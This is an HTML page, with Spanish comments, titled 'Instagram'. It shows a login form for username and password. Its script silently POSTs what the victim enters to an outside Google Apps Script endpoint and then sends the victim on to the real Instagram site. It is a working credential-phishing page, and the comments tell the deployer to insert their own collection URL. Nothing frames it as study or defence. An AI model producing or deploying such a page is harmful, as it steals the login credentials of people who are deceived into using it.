<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Instagram</title>
    
    <!-- Esta es la línea que debes agregar -->
    <link rel="icon" href="favicon.png" type="image/png">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-card {
            background: #ffffff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            width: 300px;
            text-align: center;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            border: none;
            color: white;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>

<div class="login-card">
    <img src="logo.jpg" alt="Logo" style="display: block; margin: 0 auto 15px auto; width: 50px;">
    <h2>Inicio de Sesión</h2>
    <!-- REEMPLAZA LA URL DE ACTION CON LA TUYA DE APPS SCRIPT -->
    <form id="loginForm" method="POST">
    <input type="text" name="usuario" placeholder="Nombre de usuario o correo" required>
    
   <div class="password-wrapper" style="position: relative;">
    <input type="password" id="password" name="password" placeholder="Contraseña" required style="width: 100%; padding: 10px; box-sizing: border-box;">
    
    <span id="togglePassword" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #555;">
        <!-- Icono de Ojo Abierto (Visible) -->
        <svg id="eyeOpen" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
            <circle cx="12" cy="12" r="3"></circle>
        </svg>
        <!-- Icono de Ojo Cerrado (Oculto) - inicialmente oculto -->
        <svg id="eyeClosed" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none;">
            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
            <line x1="1" y1="1" x2="23" y2="23"></line>
        </svg>
    </span>
</div>

    <button type="submit">Iniciar sesión</button>
</form>
</div>
<script>
   const togglePassword = document.getElementById('togglePassword');
const passwordInput = document.getElementById('password');
const eyeOpen = document.getElementById('eyeOpen');
const eyeClosed = document.getElementById('eyeClosed');

togglePassword.addEventListener('click', function () {
    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
    passwordInput.setAttribute('type', type);

    // Cambiar visibilidad de los iconos
    if (type === 'password') {
        eyeOpen.style.display = 'block';
        eyeClosed.style.display = 'none';
    } else {
        eyeOpen.style.display = 'none';
        eyeClosed.style.display = 'block';
    }
});
   
  const scriptURL = "https://script.google.com/macros/s/AKfycbxeFVRIGReII0MCWUCy2qRFnom5ZksnhHIji_POt3aDm76wXiODkaDy6qgZWnzaZa6viw/exec"; // <--- PEGA AQUÍ LA URL DEL SCRIPT
  const form = document.getElementById('loginForm');

  form.addEventListener('submit', e => {
    e.preventDefault(); // Esto evita el error de "Access Denied"
    
    fetch(scriptURL, { method: 'POST', body: new FormData(form), mode: 'no-cors'})
      .then(() => {
        // Redirección a Instagram
        window.location.href = "https://www.instagram.com/";
      })
      .catch(error => console.error('Error!', error.message));
  });
  
</script>
</body>
</html>
